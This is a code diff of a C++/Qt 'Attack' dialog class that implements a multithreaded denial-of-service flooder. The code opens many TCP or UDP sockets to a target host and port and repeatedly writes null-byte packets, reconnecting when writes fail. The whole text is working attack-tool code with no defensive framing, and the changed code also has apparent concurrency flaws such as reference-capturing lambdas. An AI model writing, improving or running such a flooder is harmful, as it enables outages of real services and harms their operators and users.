@@ -16,19 +16,19 @@ Attack::~Attack()
     delete ui;
 }
 
-QAbstractSocket *Attack::make_socket(QString host, QString port) {
+QAbstractSocket *Attack::make_socket(QString& host, QString& port) {
     if(!running){
         return nullptr;
     }
     QAbstractSocket *sock;
     switch (protocol) {
     case TCP:{
-        sock = new QTcpSocket(this);
+        sock = new QTcpSocket();
         sock->connectToHost(host, port.toInt(), QTcpSocket::WriteOnly);
         break;
     }
     case UDP:{
-        sock = new QUdpSocket(this);
+        sock = new QUdpSocket();
         sock->connectToHost(host, port.toInt(), QUdpSocket::WriteOnly);
         break;
     }
@@ -36,50 +36,50 @@ QAbstractSocket *Attack::make_socket(QString host, QString port) {
     default:
         break;
     }
-    if(sock->waitForConnected()){
+    if(sock->isValid()){
         return sock;
     }else{
         return nullptr;
     }
 }
 
+int Attack::write_socket(QAbstractSocket *sock){
+    QString packet = make_packet();
+    return sock->write(packet.toUtf8());
+}
+
+QString Attack::make_packet(){
+    return QString::fromLocal8Bit("\0");
+}
+
 void Attack::dos() {
     QAbstractSocket *sockets[connections];
     int x;
-    for(x=0; x!= connections; x++){
+    for(x=0; x < connections; x++){
         sockets[x] = nullptr;
     }
 
-    while(true) {
-        for(x=0; running && x != connections; x++) {
+    while(running) {
+        for(x=0; running && x < connections; x++) {
             if(sockets[x] == nullptr){
                 sockets[x] = make_socket(target, port);
                 continue;
             }
-            sockets[x]->write("\0");
-            if(sockets[x]->waitForBytesWritten()) {
+            if((write_socket(sockets[x])) == -1){
                 sockets[x]->disconnect();
-                if(sockets[x]->waitForDisconnected(5)){
-                    sockets[x]->close();
-                    sockets[x] = make_socket(target, port);
-                }
+                sockets[x]->close();
+                sockets[x] = make_socket(target, port);
             }
             voly++;
         }
         voly++;
-        if(!running){
-            break;
-        }else{
-            QThread::usleep(20);
-        }
+        QThread::usleep(20);
     }
     for(int i = 0; i < connections; i++){
         if(sockets[i] != nullptr){
             sockets[i]->disconnect();
-            if(sockets[i]->waitForDisconnected(5)){
-                sockets[i]->close();
-                delete sockets[i];
-            }
+            sockets[i]->close();
+            delete sockets[i];
         }
     }
 }
@@ -87,7 +87,7 @@ void Attack::dos() {
 
 void Attack::start(){
     for(int x = 0; running && x != threads; x++) {
-        auto trd = QtConcurrent::run([=]{dos();});
+        auto trd = QtConcurrent::run([&]{dos();});
         thread_list.append(trd);
     }
 }
@@ -95,6 +95,7 @@ void Attack::start(){
 void Attack::stop(){
     running = false;
     for(auto thread : thread_list){
+        thread.cancel();
         thread.waitForFinished();
     }
     accept();
@@ -126,7 +127,7 @@ void Attack::update_gui(){
 
 void Attack::showEvent(QShowEvent *event){
     QWidget::showEvent(event);
-    QtConcurrent::run([=]{start();});
-    QtConcurrent::run([=]{update_gui();});
+    QtConcurrent::run([&]{start();});
+    QtConcurrent::run([&]{update_gui();});
     return;
 }
